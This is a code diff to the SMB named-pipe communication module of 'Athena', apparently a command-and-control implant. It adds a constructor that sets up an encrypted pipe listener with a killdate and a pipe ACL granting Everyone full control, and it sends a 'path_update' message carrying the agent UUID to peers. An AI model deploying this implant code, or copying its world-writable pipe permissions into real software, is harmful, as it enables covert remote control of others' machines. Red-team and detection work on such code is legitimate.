@@ -78,6 +78,38 @@ namespace Athena
 
             Debug.WriteLine($"[{DateTime.Now}] Started SMB Server. Listening on {this.pipeName}");
         }
+
+        public Smb(string uuid, string psk, string pipename)
+        {
+            this.uuid = uuid;
+            this.psk = psk;
+            this.pipeName= pipename;
+            this.connected = false;
+            this.sleep = 0;
+            this.jitter = 0; ;
+            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
+            this.killDate = kd;
+            if (!string.IsNullOrEmpty(this.psk))
+            {
+                this.crypt = new PSKCrypto(this.uuid, this.psk);
+                this.encrypted = true;
+            }
+            this.serverPipe = new PipeServer<SmbMessage>(this.pipeName);
+            if (Environment.OSVersion.Platform == PlatformID.Win32NT)
+            {
+#pragma warning disable CA1416
+                var pipeSec = new PipeSecurity();
+                pipeSec.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
+                this.serverPipe.SetPipeSecurity(pipeSec);
+#pragma warning restore CA1416
+            }
+            this.cancellationToken = this.cts.Token;
+            this.serverPipe.ClientConnected += async (o, args) => await OnClientConnection();
+            this.serverPipe.ClientDisconnected += async (o, args) => await OnClientDisconnect();
+            this.serverPipe.MessageReceived += (sender, args) => OnMessageReceive(args);
+            this.serverPipe.StartAsync(this.cancellationToken);
+
+        }
         public async Task StartBeacon()
         {
             Debug.WriteLine($"[{DateTime.Now}] Starting Beacon Loop.");
@@ -212,19 +244,14 @@ namespace Athena
             Debug.WriteLine($"[{DateTime.Now}] New Client Connected!");
             onClientConnectedSignal.Set();
             this.connected = true;
-            if (this.checkedin)
-            {
-                Debug.WriteLine($"[{DateTime.Now}] We're already checked in so sending a get_tasking");
-                GetTasking gt = new GetTasking()
-                {
-                    action = "get_tasking",
-                    tasking_size = -1,
-                    delegates = new List<DelegateMessage>(),
-                    socks = new List<SocksMessage>(),
-                    responses = new List<string>(),
-                };
-                await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking));
-            }
+
+            await this.SendUpdate();
+
+            //if (this.checkedin)
+            //{
+            //    await this.SendUpdate();
+            //}
+            
         }
         private async Task OnClientDisconnect()
         {
@@ -288,7 +315,6 @@ namespace Athena
 
             return String.Empty;
         }
-
         private async Task SendSuccess()
         {
             //Indicate the server that we're done processing the message and it can send the next one (if it's there)
@@ -297,6 +323,18 @@ namespace Athena
                 message_type = "success",
                 final = true,
                 delegate_message = String.Empty
+            };
+
+            await this.serverPipe.WriteAsync(sm);
+        }
+
+        private async Task SendUpdate()
+        {
+            SmbMessage sm = new SmbMessage()
+            {
+                final = true,
+                message_type = "path_update",
+                delegate_message = this.uuid
             };
 
             await this.serverPipe.WriteAsync(sm);
